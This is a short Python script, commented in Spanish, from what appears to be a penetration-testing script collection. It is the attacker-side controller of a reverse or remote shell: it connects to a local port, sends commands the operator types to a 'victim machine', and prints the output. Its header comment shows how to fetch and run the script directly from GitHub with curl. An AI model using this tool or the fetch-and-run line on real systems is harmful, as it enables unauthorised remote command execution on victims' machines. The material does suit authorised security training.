#!/usr/bin/env python3

# Ejecución remota:
#   python3 <(curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/2-Exploit/RevShell/Python/attacker.py)

from socket import socket, SOL_SOCKET, SO_REUSEADDR

def fCerrarSocket(vSocket):
  try:
    if vSocket:
      vSocket.close()
  except:
    pass

def fMain():
  cIpServidor = '127.0.0.1'
  cPuertoServidor = 5000
  cTamBuffer = 4096

  vServerAddress = (cIpServidor, cPuertoServidor)
  vEstado = True
  vClientSocket = None

  try:
    vClientSocket = socket()
    vClientSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    vClientSocket.connect(vServerAddress)

    while vEstado:
      vComandoEnviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ").strip()

      if vComandoEnviar == 'exit':
        vClientSocket.send(vComandoEnviar.encode())
        vEstado = False
      else:
        vClientSocket.send(vComandoEnviar.encode())
        vRespuesta = vClientSocket.recv(cTamBuffer)
        print(vRespuesta.decode())

  finally:
    fCerrarSocket(vClientSocket)


if __name__ == '__main__':
  fMain()
